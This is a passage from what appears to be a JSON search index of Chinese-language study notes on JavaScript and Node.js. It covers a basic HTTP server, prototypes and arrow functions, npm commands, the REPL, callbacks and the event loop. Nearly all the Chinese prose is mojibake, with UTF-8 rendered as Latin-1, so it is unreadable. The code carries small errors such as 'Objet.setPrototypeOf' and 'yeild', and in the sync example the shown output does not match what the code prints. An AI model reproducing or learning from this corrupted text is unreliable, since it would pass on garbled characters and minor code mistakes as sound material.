\r"},{"id":75,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/html5/javascript%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"Java Scriptè‡ªå­¦ç¬”è®°","section":"html5","content":"è‡ªå­¦ç¬”è®° (pdf) #  \r"},{"id":76,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/1.%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90/","title":"1.ç®€å•çš„ä¾‹å­","section":"nodejs","content":" å‚è€ƒï¼š\n https://www.runoob.com/nodejs/nodejs-http-server.html   ç¬¬ä¸€ä¸ªç¨‹åº #  HelloWorld #  åœ¨ Mac ä¸Šç›´æ¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å³å¯å®‰è£…ï¼š\nbrew install node HelloWorld ç¨‹åºï¼Œå¯ä»¥æ£€æµ‹å®‰è£…çŠ¶æ€ï¼š\nconsole.log(\u0026#34;Hello World\u0026#34;); ç®€å•çš„ WEB æœåŠ¡å™¨ #  åœ¨æˆ‘ä»¬åˆ›å»º Node.js ç¬¬ä¸€ä¸ª \u0026ldquo;Hello, World!\u0026rdquo; åº”ç”¨å‰ï¼Œè®©æˆ‘ä»¬å…ˆäº†è§£ä¸‹ Node.js åº”ç”¨æ˜¯ç”±å“ªå‡ éƒ¨åˆ†ç»„æˆçš„ï¼š\n **å¼•å…¥ required æ¨¡å—ï¼š**æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ require æŒ‡ä»¤æ¥è½½å…¥ Node.js æ¨¡å—ã€‚ **åˆ›å»ºæœåŠ¡å™¨ï¼š**æœåŠ¡å™¨å¯ä»¥ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç±»ä¼¼äº Apache ã€Nginx ç­‰ HTTP æœåŠ¡å™¨ã€‚ **æ¥æ”¶è¯·æ±‚ä¸å“åº”è¯·æ±‚ï¼š**æœåŠ¡å™¨å¾ˆå®¹æ˜“åˆ›å»ºï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æˆ–ç»ˆç«¯å‘é€ HTTP è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥æ”¶è¯·æ±‚åè¿”å›å“åº”æ•°æ®ã€‚  ä»£ç å¦‚ä¸‹ï¼š\nvar http = require(\u0026#39;http\u0026#39;);  http.createServer(function (request, response) {  // å‘é€ HTTP å¤´éƒ¨  // HTTP çŠ¶æ€å€¼: 200 : OK  // å†…å®¹ç±»å‹: text/plain  response.writeHead(200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;});   // å‘é€å“åº”æ•°æ® \u0026#34;Hello World\u0026#34;  response.end(\u0026#39;Hello World\\n\u0026#39;); }).listen(8888);  // ç»ˆç«¯æ‰“å°å¦‚ä¸‹ä¿¡æ¯ console.log(\u0026#39;Server running at http://127.0.0.1:8888/\u0026#39;); "},{"id":77,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/10.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB/","title":"10.å‡½æ•°ä¸ç±»","section":"nodejs","content":"å‡½æ•°ä¸ç±» #  prototype #  ç®€å•åœ°è¯´ï¼ŒJavaScript æ˜¯åŸºäºåŸå‹çš„è¯­è¨€ã€‚\nå½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå¦‚æœå¯¹è±¡æ²¡æœ‰è¯¥å±æ€§ï¼ŒJavaScript è§£é‡Šå™¨å°±ä¼šä»å¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸Šå»æ‰¾è¯¥å±æ€§ï¼Œå¦‚æœåŸå‹ä¸Šä¹Ÿæ²¡æœ‰è¯¥å±æ€§ï¼Œé‚£å°±å»æ‰¾åŸå‹çš„åŸå‹ï¼Œç›´åˆ°æœ€åè¿”å› null ä¸ºæ­¢ï¼Œnullæ²¡æœ‰åŸå‹ã€‚è¿™ç§å±æ€§æŸ¥æ‰¾çš„æ–¹å¼è¢«ç§°ä¸ºåŸå‹é“¾ï¼ˆprototype chainï¼‰ã€‚\nnew #  å½“ js è¯­è¨€æ‰§è¡Œ new æ“ä½œæ—¶å…·ä½“æ—¶æ‰§è¡Œçš„ä»€ä¹ˆæ“ä½œå‘¢ï¼Ÿ\n  åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ u = {}\n  ç»‘å®šåŸå‹ï¼Œu.__proto__ = User.prototype æˆ– Objet.setPrototypeOf(u, User.prototype)ï¼›\n  è°ƒç”¨ User() å‡½æ•°ï¼Œå¹¶æŠŠç©ºå¯¹è±¡ u å½“åš this ä¼ å…¥ï¼Œå³ User.call(u)ï¼›\n  å¦‚æœ User() å‡½æ•°æ‰§è¡Œå®Œè‡ªå·± return ä¸€ä¸ª object ç±»å‹ï¼Œé‚£ä¹ˆè¿”å›æ­¤å˜é‡ï¼Œå¦åˆ™è¿”å› thisã€‚\nPSï¼šå¦‚æœæ„é€ å‡½æ•°è¿”å›åŸºæœ¬ç±»å‹å€¼ï¼Œåˆ™ä¸å½±å“ï¼Œè¿˜æ˜¯è¿”å› this\n  ç®­å¤´å‡½æ•°ä¸æ™®é€šå‡½æ•° #  åŒºåˆ«ï¼š\n ç®­å¤´å‡½æ•°ä¸ä¼šåˆ›å»ºè‡ªå·±çš„ thisï¼šå®ƒä¼šä»è‡ªå·±çš„ä½œç”¨åŸŸé“¾ä¸Šç»§æ‰¿ä¸€ä¸ª thisï¼› ç®­å¤´å‡½æ•°çš„ this æ°¸è¿œä¸å˜ï¼šå®ƒçš„ this åœ¨è¢«å®šä¹‰æ—¶å°±å·²ç»ç¡®å®šäº†ï¼ˆcall/apply/bind éƒ½æ— æ³•æ”¹å˜ç®­å¤´å‡½æ•°çš„æŒ‡å‘ï¼‰ï¼› ç®­å¤´å‡½æ•°ä¸èƒ½ä½œä¸ºæ„é€ å‡½æ•°ä½¿ç”¨ï¼ˆæœ¬è´¨æ˜¯å› ä¸º this æ— æ³•æ”¹å˜ï¼‰ï¼› ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„ argumentï¼Œæ²¡æœ‰ prototypeï¼› ç®­å¤´å‡½æ•°ä¸èƒ½ä½¿ç”¨ yeild å…³é”®å­—ï¼›  "},{"id":78,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/2.npm%E4%BB%8B%E7%BB%8D/","title":"2. Npmä»‹ç»","section":"nodejs","content":" å‚è€ƒï¼š\n https://www.runoob.com/nodejs/nodejs-npm.html   NPM #  ä»‹ç» #  NPM æ˜¯éšåŒ node.js ä¸€èµ·å®‰è£…çš„åŒ…ç®¡ç†å·¥å…·ï¼Œèƒ½è§£å†³ node.js ä»£ç éƒ¨ç½²ä¸Šçš„å¾ˆå¤šé—®é¢˜ã€‚\nå¸¸è§çš„ä½¿ç”¨åœºæ™¯æœ‰ä»¥ä¸‹å‡ ç§ï¼š\n å…è®¸ç”¨æˆ·ä» NPM æœåŠ¡å™¨ä¸‹è½½ï¼Œåˆ«äººç¼–å†™çš„ç¬¬ä¸‰æ–¹åŒ…åˆ°æœ¬åœ°ä½¿ç”¨ã€‚ å…è®¸ç”¨æˆ·ä» NPM æœåŠ¡å™¨ä¸‹è½½å¹¶å®‰è£…ï¼Œåˆ«äººç¼–å†™çš„å‘½ä»¤è¡Œç¨‹åºåˆ°æœ¬åœ°ä½¿ç”¨ã€‚ å…è®¸ç”¨æˆ·å°†è‡ªå·±ç¼–å†™çš„åŒ…æˆ–å‘½ä»¤è¡Œç¨‹åºï¼Œä¸Šä¼ åˆ° NPM æœåŠ¡å™¨ä¾›åˆ«äººä½¿ç”¨ã€‚  é€šè¿‡æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ£€æµ‹æ˜¯å¦å®‰è£…ï¼š\nnpm -v å¦‚æœä½ å®‰è£…çš„æ˜¯æ—§ç‰ˆæœ¬çš„ npmï¼Œå¯ä»¥å¾ˆå®¹æ˜“å¾—é€šè¿‡ npm å‘½ä»¤æ¥å‡çº§ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\nsudo npm install npm -g å‘½ä»¤è¡Œä½¿ç”¨æ–¹å¼ #  æœ¬åœ°å®‰è£… #  ä»¥ express ä¸ºä¾‹ï¼Œå®‰è£…æ–¹å¼ä¸ºï¼š\nnpm install express è¿™ç§å®‰è£…æ–¹å¼ï¼š\n å°†å®‰è£…åŒ…æ”¾åœ¨ ./node_modules ä¸‹ï¼ˆè¿è¡Œ npm å‘½ä»¤æ—¶æ‰€åœ¨çš„ç›®å½•ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ node_modules ç›®å½•ï¼Œä¼šåœ¨å½“å‰æ‰§è¡Œ npm å‘½ä»¤çš„ç›®å½•ä¸‹ç”Ÿæˆ node_modules ç›®å½•ã€‚ å¯ä»¥é€šè¿‡ require() æ¥å¼•å…¥æœ¬åœ°å®‰è£…çš„åŒ…ã€‚  å…¨å±€å®‰è£… #  ä»¥ express ä¸ºä¾‹ï¼Œå®‰è£…æ–¹å¼ä¸ºï¼š\nnpm install express -g è¿™ç§å®‰è£…æ–¹å¼ï¼š\n å°†å®‰è£…åŒ…æ”¾åœ¨ /usr/local ä¸‹æˆ–è€…ä½  node çš„å®‰è£…ç›®å½•ã€‚ å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œé‡Œä½¿ç”¨ã€‚  é“¾æ¥ #  npm link ç”¨æ¥åœ¨æœ¬åœ°é¡¹ç›®å’Œæœ¬åœ° npm æ¨¡å—ä¹‹é—´å»ºç«‹è¿æ¥ï¼Œå¯ä»¥åœ¨æœ¬åœ°è¿›è¡Œæ¨¡å—æµ‹è¯•ï¼š\n  é¡¹ç›®å’Œæ¨¡å—åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„\nnpm link ../module   é¡¹ç›®å’Œæ¨¡å—ä¸åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ï¼š\ncd module \u0026amp;\u0026amp; npm link # è¿›è¡Œå…¨å±€link  cd project \u0026amp;\u0026amp; npm link \u0026lt;Module Name\u0026gt; # æ¨¡å—åæŒ‡ package.json ä¸­çš„ name   è§£é™¤ linkï¼š\n# è§£é™¤é¡¹ç›®å’Œæ¨¡å— link cd project \u0026amp;\u0026amp; npm unlink \u0026lt;Module Name\u0026gt;  # è§£é™¤æ¨¡å—å…¨å±€ link cd module \u0026amp;\u0026amp; npm unlink \u0026lt;Module Name\u0026gt;   å¦‚æœä½ å¸Œæœ›å…¼å…·æœ¬åœ°å®‰è£…ã€å…¨å±€å®‰è£…çš„åŠŸèƒ½ï¼Œåˆ™éœ€è¦åœ¨ä¸¤ä¸ªåœ°æ–¹å®‰è£…å®ƒæˆ–ä½¿ç”¨ npm linkã€‚\næŸ¥çœ‹å®‰è£…ä¿¡æ¯ #  ä½ å¯ä»¥ç”¨ä»¥ä¸‹çš„å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å…¨å±€å®‰è£…çš„æ¨¡å—ï¼š\nnpm list -g å¦‚æœè¦æŸ¥çœ‹æŸä¸ªæ¨¡å—çš„ç‰ˆæœ¬å·ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š\nnpm list \u0026lt;Module Name\u0026gt; å¸è½½æ¨¡å— #  æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¸è½½ Node.js æ¨¡å—ã€‚\nnpm uninstall express å¸è½½åï¼Œä½ å¯ä»¥åˆ° /node_modules/ ç›®å½•ä¸‹æŸ¥çœ‹åŒ…æ˜¯å¦è¿˜å­˜åœ¨ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š\nnpm ls æ›´æ–°æ¨¡å— #  æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ›´æ–°æ¨¡å—ï¼š\nnpm update express æŠŠå½“å‰ç›®å½•ä¸‹ node_modules å­ç›®å½•é‡Œè¾¹çš„å¯¹åº”æ¨¡å—æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ï¼š\nnpm update æŠŠå…¨å±€å®‰è£…çš„å¯¹åº”å‘½ä»¤è¡Œç¨‹åºæ›´æ–°è‡³æœ€æ–°ç‰ˆï¼š\nnpm update -g åˆ›å»ºæ¨¡å— #  åˆ›å»ºæ¨¡å—ï¼Œpackage.json æ–‡ä»¶æ˜¯å¿…ä¸å¯å°‘çš„ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ NPM ç”Ÿæˆ package.json æ–‡ä»¶ï¼Œç”Ÿæˆçš„æ–‡ä»¶åŒ…å«äº†åŸºæœ¬çš„ç»“æœã€‚\nnpm init ä»¥ä¸Šçš„å‘½ä»¤ä¼šè¦æ±‚è¾“å…¥ä¿¡æ¯ï¼Œéœ€è¦æ ¹æ®ä¸ªäººçš„æƒ…å†µè¾“å…¥ã€‚åœ¨æœ€åè¾“å…¥ \u0026ldquo;yes\u0026rdquo; åä¼šç”Ÿæˆ package.json æ–‡ä»¶ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ npm èµ„æºåº“ä¸­æ³¨å†Œç”¨æˆ·ï¼ˆä½¿ç”¨é‚®ç®±æ³¨å†Œï¼‰ï¼š\nnpm adduser æ¥ä¸‹æ¥æˆ‘ä»¬å°±ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å‘å¸ƒæ¨¡å—ï¼š\nnpm publish å…¶ä»–å¸¸ç”¨å‘½ä»¤ #  é™¤äº†æœ¬ç« ä»‹ç»çš„éƒ¨åˆ†å¤–ï¼ŒNPMè¿˜æä¾›äº†å¾ˆå¤šåŠŸèƒ½ï¼Œpackage.json é‡Œä¹Ÿæœ‰å¾ˆå¤šå…¶å®ƒæœ‰ç”¨çš„å­—æ®µã€‚è¯¦ç»†å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼šnpmjs.org/doc/ã€‚\nè¿™é‡Œå†ä»‹ç»ä¸€äº›NPMå¸¸ç”¨å‘½ä»¤ã€‚\n  ä½¿ç”¨ æŸ¥çœ‹æŸæ¡å‘½ä»¤çš„è¯¦ç»†å¸®åŠ©ï¼Œä¾‹å¦‚ install\nnpm help install   åœ¨ package.json æ‰€åœ¨ç›®å½•ä¸‹ä½¿ç”¨ï¼š\nnpm install . -g  ï¿½å…ˆåœ¨æœ¬åœ°å®‰è£…å½“å‰å‘½ä»¤è¡Œç¨‹åºï¼Œå¯ç”¨äºå‘å¸ƒå‰çš„æœ¬åœ°æµ‹è¯•ã€‚   æ¸…ç©º NPM æœ¬åœ°ç¼“å­˜ï¼Œç”¨äºå¯¹ä»˜ä½¿ç”¨ç›¸åŒç‰ˆæœ¬å·å‘å¸ƒæ–°ç‰ˆæœ¬ä»£ç çš„äººï¼š\nnpm cache clear   æ’¤é”€å‘å¸ƒè‡ªå·±å‘å¸ƒè¿‡çš„æŸä¸ªç‰ˆæœ¬ä»£ç ï¼š\nnpm unpublish @   ä½¿ç”¨ä»¥ä¸‹æ¥æœç´¢æ¨¡å—ï¼š\n  npm search express è¡¥å…… #  ç‰ˆæœ¬å· #  ä½¿ç”¨NPMä¸‹è½½å’Œå‘å¸ƒä»£ç æ—¶éƒ½ä¼šæ¥è§¦åˆ°ç‰ˆæœ¬å·ã€‚NPMä½¿ç”¨è¯­ä¹‰ç‰ˆæœ¬å·æ¥ç®¡ç†ä»£ç ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ã€‚\nè¯­ä¹‰ç‰ˆæœ¬å·åˆ†ä¸º X.Y.Z ä¸‰ä½ï¼Œåˆ†åˆ«ä»£è¡¨ä¸»ç‰ˆæœ¬å·ã€æ¬¡ç‰ˆæœ¬å·å’Œè¡¥ä¸ç‰ˆæœ¬å·ã€‚\nå½“ä»£ç å˜æ›´æ—¶ï¼Œç‰ˆæœ¬å·æŒ‰ä»¥ä¸‹åŸåˆ™æ›´æ–°ï¼š\n å¦‚æœåªæ˜¯ä¿®å¤ bugï¼Œéœ€è¦æ›´æ–° Z ä½ã€‚ å¦‚æœæ˜¯æ–°å¢äº†åŠŸèƒ½ï¼Œä½†æ˜¯å‘ä¸‹å…¼å®¹ï¼Œéœ€è¦æ›´æ–° Y ä½ã€‚ å¦‚æœæœ‰å¤§å˜åŠ¨ï¼Œå‘ä¸‹ä¸å…¼å®¹ï¼Œéœ€è¦æ›´æ–° X ä½ã€‚  ç‰ˆæœ¬å·æœ‰äº†è¿™ä¸ªä¿è¯åï¼Œåœ¨ç”³æ˜ç¬¬ä¸‰æ–¹åŒ…ä¾èµ–æ—¶ï¼Œé™¤äº†å¯ä¾èµ–äºä¸€ä¸ªå›ºå®šç‰ˆæœ¬å·å¤–ï¼Œè¿˜å¯ä¾èµ–äºæŸä¸ªèŒƒå›´çš„ç‰ˆæœ¬å·ã€‚\nä½¿ç”¨æ·˜å® NPM é•œåƒ #  å¤§å®¶éƒ½çŸ¥é“å›½å†…ç›´æ¥ä½¿ç”¨ npm çš„å®˜æ–¹é•œåƒæ˜¯éå¸¸æ…¢çš„ï¼Œè¿™é‡Œæ¨èä½¿ç”¨æ·˜å® NPM é•œåƒã€‚\næ·˜å® NPM é•œåƒæ˜¯ä¸€ä¸ªå®Œæ•´ npmjs.org é•œåƒï¼Œä½ å¯ä»¥ç”¨æ­¤ä»£æ›¿å®˜æ–¹ç‰ˆæœ¬(åªè¯»)ï¼ŒåŒæ­¥é¢‘ç‡ç›®å‰ä¸º 10åˆ†é’Ÿ ä¸€æ¬¡ä»¥ä¿è¯å°½é‡ä¸å®˜æ–¹æœåŠ¡åŒæ­¥ã€‚\nä½ å¯ä»¥ä½¿ç”¨æ·˜å®å®šåˆ¶çš„ cnpm (gzip å‹ç¼©æ”¯æŒ) å‘½ä»¤è¡Œå·¥å…·ä»£æ›¿é»˜è®¤çš„ npm:\nnpm install -g cnpm --registry=https://registry.npm.taobao.org è¿™æ ·å°±å¯ä»¥ä½¿ç”¨ cnpm å‘½ä»¤æ¥å®‰è£…æ¨¡å—äº†ï¼š\ncnpm install [name] æ›´å¤šä¿¡æ¯å¯ä»¥æŸ¥é˜…ï¼šhttp://npm.taobao.org/ã€‚\n"},{"id":79,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/3.repl/","title":"3. Repl","section":"nodejs","content":"Node.js REPL #  ä»‹ç» #  Node.js REPL (Read Eval Print Loop: äº¤äº’å¼è§£é‡Šå™¨) è¡¨ç¤ºä¸€ä¸ªç”µè„‘çš„ç¯å¢ƒï¼Œç±»ä¼¼ Window ç³»ç»Ÿçš„ç»ˆç«¯æˆ– Unix/Linux shellï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç»ˆç«¯ä¸­è¾“å…¥å‘½ä»¤ï¼Œå¹¶æ¥æ”¶ç³»ç»Ÿçš„å“åº”ã€‚\nNode è‡ªå¸¦äº†äº¤äº’å¼è§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼š\n è¯»å– Readï¼šè¯»å–ç”¨æˆ·è¾“å…¥ï¼Œè§£æè¾“å…¥äº†Javascript æ•°æ®ç»“æ„å¹¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚ æ‰§è¡Œ Evalï¼šæ‰§è¡Œè¾“å…¥çš„æ•°æ®ç»“æ„ æ‰“å° Printï¼šè¾“å‡ºç»“æœ å¾ªç¯ Loopï¼šå¾ªç¯æ“ä½œä»¥ä¸Šæ­¥éª¤ç›´åˆ°ç”¨æˆ·ä¸¤æ¬¡æŒ‰ä¸‹ ctrl-c æŒ‰é’®é€€å‡ºã€‚  Node çš„äº¤äº’å¼è§£é‡Šå™¨å¯ä»¥å¾ˆå¥½çš„è°ƒè¯• Javascript ä»£ç ã€‚\nå­¦ä¹  REPL #  æˆ‘ä»¬å¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨ Node çš„ç»ˆç«¯ï¼š\nnode è¿™ä¸ªç»ˆç«¯å†…çš„è¿è¡Œæ•ˆæœè·Ÿ chrome ä¸­çš„ console ä¸­å·®å¼‚ä¸å¤§ã€‚\né™¤äº†æ•°å€¼è®¡ç®—ã€å‡½æ•°ã€é€»è¾‘æ§åˆ¶è¿™äº›å…¶ä»–è¯­è¨€éƒ½å…·å¤‡çš„åŠŸèƒ½ä¹‹å¤–ï¼Œä»¥ä¸‹ç‰¹æ€§å€¼å¾—å­¦ä¹ ï¼š\n ä¸‹åˆ’çº¿(_)å˜é‡ï¼šä½ å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ _ è·å–ä¸Šä¸€ä¸ªè¡¨è¾¾å¼çš„è¿ç®—ç»“æœï¼š ctrl + cï¼šé€€å‡ºå½“å‰ç»ˆç«¯ã€‚ ctrl + c æŒ‰ä¸‹ä¸¤æ¬¡ / ctrl + dï¼šé€€å‡º Node REPLã€‚ :arrow_up:/:arrow_down:ï¼šæŸ¥çœ‹è¾“å…¥çš„å†å²å‘½ä»¤ tab é”®ï¼šåˆ—å‡ºå½“å‰å‘½ä»¤ .helpï¼šåˆ—å‡ºä½¿ç”¨å‘½ä»¤ .break / .clearï¼šé€€å‡ºå¤šè¡Œè¡¨è¾¾å¼ .save \u0026lt;filename\u0026gt;ï¼šä¿å­˜å½“å‰çš„ Node REPL ä¼šè¯åˆ°æŒ‡å®šæ–‡ä»¶ .load \u0026lt;filename\u0026gt;ï¼šè½½å…¥å½“å‰ Node REPL ä¼šè¯çš„æ–‡ä»¶å†…å®¹ã€‚  "},{"id":80,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/4.%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/","title":"4.å›è°ƒå‡½æ•°","section":"nodejs","content":"å›è°ƒå‡½æ•° #  ä»‹ç» #  Node.js å¼‚æ­¥ç¼–ç¨‹çš„ç›´æ¥ä½“ç°å°±æ˜¯å›è°ƒã€‚\nå¼‚æ­¥ç¼–ç¨‹ä¾æ‰˜äºå›è°ƒæ¥å®ç°ï¼Œä½†ä¸èƒ½è¯´ä½¿ç”¨äº†å›è°ƒåç¨‹åºå°±å¼‚æ­¥åŒ–äº†ã€‚\nå›è°ƒå‡½æ•°åœ¨å®Œæˆä»»åŠ¡åå°±ä¼šè¢«è°ƒç”¨ï¼ŒNode ä½¿ç”¨äº†å¤§é‡çš„å›è°ƒå‡½æ•°ï¼ŒNode æ‰€æœ‰ API éƒ½æ”¯æŒå›è°ƒå‡½æ•°ã€‚\nå›è°ƒå‡½æ•°ä¸€èˆ¬ä½œä¸ºå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°å‡ºç°ï¼š\nfunction foo1(name, age, callback) { } function foo2(value, callback1, callback2) { } é˜»å¡ä»£ç ï¼ˆåŒæ­¥ï¼‰å®ä¾‹ #  åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ test.txt ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\nlaji shesl\u0026#39;s test case åˆ›å»º mainsync.js æ–‡ä»¶, ä»£ç å¦‚ä¸‹ï¼š\nvar fs = require(\u0026#34;fs\u0026#34;);  var data = fs.readFileSync(\u0026#39;test.txt\u0026#39;);  console.log(data.toString()); console.log(\u0026#34;done!\u0026#34;); ä»¥ä¸Šä»£ç æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š\n$ node mainsync.js laji shesl\u0026#39;s test case Done!! éé˜»å¡ä»£ç ï¼ˆå¼‚æ­¥ï¼‰å®ä¾‹ #  åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ testasync.txt ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\nlaji shesl\u0026#39;s test case åˆ›å»º mainasync.js æ–‡ä»¶, ä»£ç å¦‚ä¸‹ï¼š\nvar fs = require(\u0026#34;fs\u0026#34;);  fs.readFile(\u0026#39;test.txt\u0026#39;, function (err, data) {  if (err) return console.error(err);  console.log(data.toString()); });  console.log(\u0026#34;Done!!\u0026#34;); ä»¥ä¸Šä»£ç æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š\n$ node mainasync.js Done!! laji shesl\u0026#39;s test case "},{"id":81,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/5.%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/","title":"5.äº‹ä»¶å¾ªç¯","section":"nodejs","content":" å‚è€ƒï¼š\n  https://www.runoob.com/nodejs/nodejs-event-loop.html\n  https://zhuanlan.zhihu.com/p/37427130\n   äº‹ä»¶å¾ªç¯ #  ç®€ä»‹ #  Node.js æ˜¯å•è¿›ç¨‹å•çº¿ç¨‹åº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•å®ç°å¼‚æ­¥è°ƒç”¨çš„å‘¢ï¼Ÿ\nå®ƒç»´æŠ¤äº†å…­ä¸ª FIFO é˜Ÿåˆ—ï¼Œåˆ†åˆ«è¡¨ç¤ºä¸åŒçš„åŠŸèƒ½çš„å‡½æ•°ï¼š\n â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€\u0026gt;â”‚ timers â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ pending callbacks â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ idle, prepare â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ incoming: â”‚ â”‚ â”‚ poll â”‚\u0026lt;â”€â”€â”€â”€â”€â”¤ connections, â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ data, etc. â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ check â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€â”¤ close callbacks â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ ç„¶åå®ƒçš„å•çº¿ç¨‹åªæ‰§è¡Œä¸€ä¸ª while å¾ªç¯ï¼Œä¸€ç›´è·‘è¿™å…­ä¸ªçš„å¤´éƒ¨ä»»åŠ¡ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºæˆ–è€…æ‰§è¡Œæ—¶é—´åˆ°è¾¾ä¸Šé™ã€‚\næ¯ä¸ªé˜¶æ®µæ‰§è¡Œçš„åŠŸèƒ½å¦‚ä¸‹ï¼š\n  timerï¼šè¿™ä¸ªé˜¶æ®µæ‰§è¡Œé€šè¿‡ setTimeout() å’Œ setInterval() è®¾ç½®çš„å›è°ƒå‡½æ•°ï¼›\n  I/O callbackï¼šæ‰§è¡Œå»¶è¿Ÿåˆ°ä¸‹ä¸€ä¸ªå¾ªç¯è¿­ä»£çš„ I/O å›è°ƒï¼›\n  idle,prepareï¼šç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯ liuv 